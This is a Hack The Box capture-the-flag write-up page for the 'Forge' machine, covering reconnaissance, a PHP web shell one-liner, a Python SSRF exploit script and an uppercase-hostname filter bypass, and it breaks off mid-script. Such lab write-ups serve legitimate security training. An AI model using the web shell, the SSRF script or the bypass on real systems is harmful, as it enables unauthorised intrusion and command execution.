@@ -1,0 +1,943 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Joe Ammond (pugpug)">
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
+    
+    
+      
+        <title>Forge - pugpug's Hack The Box writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.bb3983ee.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../css/print.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#forge-linux-medium" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="pugpug&#39;s Hack The Box writeups" class="md-header__button md-logo" aria-label="pugpug's Hack The Box writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            pugpug's Hack The Box writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Forge
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="pugpug&#39;s Hack The Box writeups" class="md-nav__button md-logo" aria-label="pugpug's Hack The Box writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    pugpug's Hack The Box writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Welcome
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Machines
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Machines" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Machines
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Academy/" class="md-nav__link">
+        Academy
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Forge
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Forge
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user" class="md-nav__link">
+    User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root" class="md-nav__link">
+    Root
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    Final thoughts
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#user" class="md-nav__link">
+    User
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#root" class="md-nav__link">
+    Root
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#final-thoughts" class="md-nav__link">
+    Final thoughts
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+<h1 id="forge-linux-medium">Forge (Linux Medium)<a class="headerlink" href="#forge-linux-medium" title="Permanent link">#</a></h1>
+<p><img alt="Forge info card" src="../../img/Forge/00.png" /></p>
+<p>Forge is a medium-rated Linux machine by
+<a href="https://app.hackthebox.com/users/393721">NoobHacker99</a>. We'll
+exploit two <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Server-Side Request
+FORGEry</a>
+vulnerabilities to gain access to an internal-only FTP server with an ssh private
+key for access to the machine. To gain root, we'll break a Python script and use
+the Python debugger to execute a shell.</p>
+<h2 id="reconnaissance">Reconnaissance<a class="headerlink" href="#reconnaissance" title="Permanent link">#</a></h2>
+<p>An initial nmap scan shows only 3 ports open: 21, 22, and 80:</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>nmap -v -n -p- -Pn -sS -O -oA forge-alltcp <span class="m">10</span>.10.11.111
+
+<span class="go">Nmap scan report for 10.10.11.111</span>
+<span class="go">Host is up (0.048s latency).</span>
+<span class="go">Not shown: 65532 closed ports</span>
+<span class="go">PORT   STATE    SERVICE</span>
+<span class="go">21/tcp filtered ftp</span>
+<span class="go">22/tcp open     ssh</span>
+<span class="go">80/tcp open     http</span>
+</code></pre></div>
+<p>The FTP service is listed as <code>filtered</code>, most likely by an <code>iptables</code> rule to block
+traffic not from the local host.</p>
+<p>Scanning the services doesn't reveal much either:</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>nmap -n -v -p <span class="m">22</span>,80 -sCV -Pn -oA forge-services <span class="m">10</span>.10.11.111
+
+<span class="go">Nmap scan report for 10.129.204.175</span>
+<span class="go">Host is up (0.035s latency).</span>
+
+<span class="go">PORT   STATE    SERVICE VERSION</span>
+<span class="go">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)</span>
+<span class="go">|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)</span>
+<span class="go">|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)</span>
+<span class="go">80/tcp open     http    Apache httpd 2.4.41</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Supported Methods: GET HEAD POST OPTIONS</span>
+<span class="go">|_http-server-header: Apache/2.4.41 (Ubuntu)</span>
+<span class="go">|_http-title: Did not follow redirect to http://forge.htb</span>
+<span class="go">Service Info: Host: 10.129.204.175; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+</code></pre></div>
+<p>The <code>OpenSSH</code> and <code>apache</code> versions indicate this is likely an Ubuntu <code>20.04</code>
+machine. The redirect to <code>http://forge.htb</code> is noteworthy, indicating we should
+check for other named-based virtual hosts on the web server. My preferred
+tool for this is <code>wfuzz</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>wfuzz -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="s1">&#39;Host: FUZZ.forge.htb&#39;</span> http://10.10.11.111
+<span class="go">********************************************************</span>
+<span class="go">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="go">********************************************************</span>
+
+<span class="go">Target: http://10.10.11.111/</span>
+<span class="go">Total requests: 19966</span>
+
+<span class="go">=====================================================================</span>
+<span class="go">ID           Response   Lines    Word       Chars       Payload                              </span>
+<span class="go">=====================================================================</span>
+
+<span class="go">000000001:   302        9 L      26 W       279 Ch      &quot;www&quot;                                </span>
+<span class="go">000000012:   302        9 L      26 W       279 Ch      &quot;ns2&quot;                                </span>
+<span class="go">000000011:   302        9 L      26 W       279 Ch      &quot;ns1&quot;                                </span>
+<span class="go">000000014:   302        9 L      26 W       286 Ch      &quot;autoconfig&quot;                         </span>
+<span class="go">000000003:   302        9 L      26 W       279 Ch      &quot;ftp&quot;</span>
+<span class="go">^C</span>
+</code></pre></div>
+<p>I'll run an initial fuzz to see how the web server responds, then run it
+again and filter out the negative results. In this instance, we can filter out
+responses with a word count of <code>26</code> words:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>wfuzz -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="s1">&#39;Host: FUZZ.forge.htb&#39;</span> --hw <span class="m">26</span> http://10.10.11.111
+<span class="go"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span>
+<span class="go">********************************************************</span>
+<span class="go">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span>
+<span class="go">********************************************************</span>
+
+<span class="go">Target: http://10.10.11.111/</span>
+<span class="go">Total requests: 19966</span>
+
+<span class="go">=====================================================================</span>
+<span class="go">ID           Response   Lines    Word       Chars       Payload</span>
+<span class="go">=====================================================================</span>
+
+<span class="go">000000024:   200        1 L      4 W        27 Ch       &quot;admin&quot;</span>
+<span class="go">000009532:   400        12 L     53 W       425 Ch      &quot;#www&quot;</span>
+<span class="go">000010581:   400        12 L     53 W       425 Ch      &quot;#mail&quot;</span>
+
+<span class="go">Total time: 83.94768</span>
+<span class="go">Processed Requests: 19966</span>
+<span class="go">Filtered Requests: 19963</span>
+<span class="go">Requests/sec.: 237.8386</span>
+</code></pre></div>
+<p><code>wfuzz</code> shows there is a website at <code>http://admin.forge.htb</code> as well.</p>
+<p>After adding <code>10.10.11.111  forge.htb admin.forge.htb</code> to <code>/etc/hosts</code>,
+we can view the site in a browser:</p>
+<p><img alt="forge.htb initial page" src="../../img/Forge/01.png" /></p>
+<p>The <code>'Upload an image'</code> link takes us to a web form where we can either upload
+a file from our local machine, or input an URL that the server will use to download
+an image for us.</p>
+<p><img alt="forge.htb upload page" src="../../img/Forge/02.png" /></p>
+<p>If not implemented correctly, this type of service can be abused
+to access resources that might not be directly accessible. </p>
+<p>Attemping to access the <code>admin</code> site is unsuccessful, but does provide a valuable clue:
+we can access the site from requests sent from the local machine.</p>
+<p><img alt="forge.htb admin page" src="../../img/Forge/03.png" /></p>
+<p>That gives us our path forward: finding a way to coerce the <code>upload</code> function into
+sending requests to the services on the local machine that are blocked to outside 
+requests. </p>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">#</a></h2>
+<p>We'll begin with attempting to learn how the <code>upload</code> function behaves. We can
+start a <code>netcat</code> listener on a port, then put our IP address in the upload function
+to see whether the site will attempt to contact us:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>nc -vnlp <span class="m">8008</span>
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )</span>
+<span class="go">Ncat: Listening on :::8008</span>
+<span class="go">Ncat: Listening on 0.0.0.0:8008</span>
+</code></pre></div>
+<p><img alt="forge.htb upload request" src="../../img/Forge/04.png" /></p>
+<p>Upon submitting the request, we get a response in our <code>netcat</code> listener:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>nc -vnlp <span class="m">8008</span>                                                                                      
+<span class="go">Ncat: Version 7.92 ( https://nmap.org/ncat )</span>
+<span class="go">Ncat: Listening on :::8008</span>
+<span class="go">Ncat: Listening on 0.0.0.0:8008</span>
+<span class="go">Ncat: Connection from 10.10.11.111.</span>
+<span class="go">Ncat: Connection from 10.10.11.111:51044.</span>
+<span class="go">GET /pugpug HTTP/1.1</span>
+<span class="go">Host: 10.10.14.8:8008</span>
+<span class="go">User-Agent: python-requests/2.25.1</span>
+<span class="go">Accept-Encoding: gzip, deflate</span>
+<span class="go">Accept: */*</span>
+<span class="go">Connection: keep-alive</span>
+
+<span class="go">^C</span>
+</code></pre></div>
+<p>By starting a Python web server, we can see how the application behaves when we
+send a valid file:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>cat pug.php
+<span class="go">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[cmd]); ?&gt;</span>
+
+<span class="gp">$ </span>python3 -m http.server <span class="m">8008</span>
+<span class="go">Serving HTTP on 0.0.0.0 port 8008 (http://0.0.0.0:8008/) ...</span>
+<span class="go">10.10.11.111 - - [22/Jan/2022 15:46:07] &quot;GET /pug.php HTTP/1.1&quot; 200 -</span>
+</code></pre></div>
+<p><img alt="forge.htb upload valid request" src="../../img/Forge/05.png" /></p>
+<p>We see in the response from the web server that it saves our data to a random
+filename:</p>
+<p><img alt="forge.htb upload valid request" src="../../img/Forge/05.png" /></p>
+<p>Fetching the URL returns the content of the transferred file:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>curl http://forge.htb/uploads/9q7dl5j6hFE25xaSgSwV
+<span class="go">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[cmd]); ?&gt;</span>
+</code></pre></div>
+<h2 id="user">User<a class="headerlink" href="#user" title="Permanent link">#</a></h2>
+<p>As we'll be poking at the website to determine how to leverage the SSRF 
+vulnerability, I'll write a quick script to quickly send requests to the 
+server and fetch the results. While it's possible to perform this either
+through the browser or via an attack proxy such as Burp, my preference is
+to create scripts to make the process easier.</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="c1"># Exploit the SSRF vulnerability on forge.htb to retrieve data from</span>
+<span class="c1"># internal services.</span>
+<span class="c1">#</span>
+<span class="c1"># Joe Ammond (pugpug)</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://forge.htb/upload&#39;</span>
+
+<span class="c1"># Abuse the SSRF on the main site</span>
+<span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">args</span><span class="p">,</span>
+        <span class="s1">&#39;remote&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
+    <span class="p">}</span>
+
+    <span class="c1"># POST request</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="c1"># Parse initial response, find href to upload URL, get it. Finding the</span>
+    <span class="c1"># uploaded URL is ugly. We wrap it in a try/except in case we hit the</span>
+    <span class="c1"># filter or the the request fails.</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;strong&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+<span class="k">class</span> <span class="nc">Term</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
+    <span class="n">prompt</span> <span class="o">=</span> <span class="s1">&#39;url&gt; &#39;</span>
+
+    <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">fetch</span><span class="p">(</span><span class="n">args</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">term</span> <span class="o">=</span> <span class="n">Term</span><span class="p">()</span>
+    <span class="n">term</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span>
+</code></pre></div>
+<p>The <code>upload</code> function accepts an <code>HTTP POST</code> request, with two required
+parameters: <code>url</code>, the URL for the server to process, and <code>remote</code>, which
+is set to <code>1</code> to specify a remote file. We send the entered URL to the
+<code>upload</code> service and process the results. If the request is successful, we
+parse out the URL where the data has been written to, fetch it and return
+the content. In the event of a failed request, we return the response from
+the <code>POST</code> to see any errors. Running the script and entering the same
+URL as the screenshot above shows the script is working:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python3 ssrf-base.py
+<span class="go">url&gt; http://10.10.14.8:8008/pug.php</span>
+<span class="go">&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[cmd]); ?&gt;</span>
+
+<span class="go">url&gt;</span>
+</code></pre></div>
+<p>Attemping to access either the <code>admin</code> site or the <code>FTP</code> server results in
+errors:</p>
+<div class="highlight"><pre><span></span><code><span class="go">url&gt; http://admin.forge.htb</span>
+<span class="go">...</span>
+<span class="go">        &lt;center&gt;</span>
+<span class="go">            &lt;strong&gt;URL contains a blacklisted address!&lt;/strong&gt;</span>
+<span class="go">        &lt;/center&gt;</span>
+<span class="go">...</span>
+
+<span class="go">url&gt; ftp://127.0.0.1/</span>
+<span class="go">...</span>
+<span class="go">        &lt;center&gt;</span>
+<span class="go">            &lt;strong&gt;Invalid protocol! Supported protocols: http, https&lt;/strong&gt;</span>
+<span class="go">        &lt;/center&gt;</span>
+<span class="go">...</span>
+</code></pre></div>
+<p>After trying some different filter bypass techniques, on a whim I attempted entering
+the hostname in uppercase. Success:</p>
+<div class="highlight"><pre><span></span><code><span class="go">url&gt; http://ADMIN.FORGE.HTB</span>
+<span class="go">&lt;!DOCTYPE html&gt;</span>
+<span class="go">&lt;html&gt;</span>
+<span class="go">&lt;head&gt;</span>
+<span class="go">    &lt;title&gt;Admin Portal&lt;/title&gt;</span>
+<span class="go">&lt;/head&gt;</span>
+<span class="go">&lt;body&gt;</span>
+<span class="go">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt;</span>
+<span class="go">    &lt;header&gt;</span>
+<span class="go">            &lt;nav&gt;</span>
+<span class="go">                &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt;</span>
+<span class="go">                &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt;</span>
+<span class="go">                &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt;</span>
+<span class="go">            &lt;/nav&gt;</span>
+<span class="go">    &lt;/header&gt;</span>
+<span class="go">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
+<span class="go">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span>
+<span class="go">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;</span>
+<span class="go">&lt;/body&gt;</span>
+<span class="go">&lt;/html&gt;</span>
+</code></pre></div>
+<p>The <code>/announcements</code> URL gives us the next part of getting to user: </p>
+<div class="highlight"><pre><span></span><code><span class="go">url&gt; http://ADMIN.FORGE.HTB/announcements</span>
+<span class="go">...</span>
+<span class="go">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;</span>
+<span class="go">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt;</span>
+<span class="go">        &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&amp;lt;url&amp;gt;.&lt;/li&gt;</span>
+<span class="go">...</span>
+</code></pre></div>
+<p>Attemping to use the credentials to access the machine via <code>SSH</code> fails:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>ssh user@forge.htb
+<span class="go">user@forge.htb: Permission denied (publickey).</span>
+</code></pre></div>
+<p>However, it looks like we can use the SSRF vulnerability on the main page to access 
+the <code>/upload</code> URL on the <code>admin</code> site, which may give us access to the internal FTP
+server. We can modify the <code>fetch()</code> function to route any URLs through the <code>admin</code>
+site:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Abuse the SSRF on the main site, routing the request to admin.forge.htb,</span>
+<span class="c1"># as the admin site accepts more request types.</span>
+<span class="k">def</span> <span class="nf">fetch</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="s1">&#39;http://ADMIN.FORGE.HTB/upload?u=</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">args</span><span class="p">),</span>
+        <span class="s1">&#39;remote&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
+    <span class="p">}</span>
+
+    <span class="c1"># POST request</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="c1"># Parse initial response, find href to upload URL, get it. Finding the</span>
+    <span class="c1"># uploaded URL is ugly. We wrap it in a try/except in case we hit the</span>
+    <span class="c1"># filter or the the request fails.</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;strong&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">text</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="c1"># Parse the second page returned, to see whether the request from</span>
+    <span class="c1"># admin was successful.</span>
+    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;strong&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">text</span>
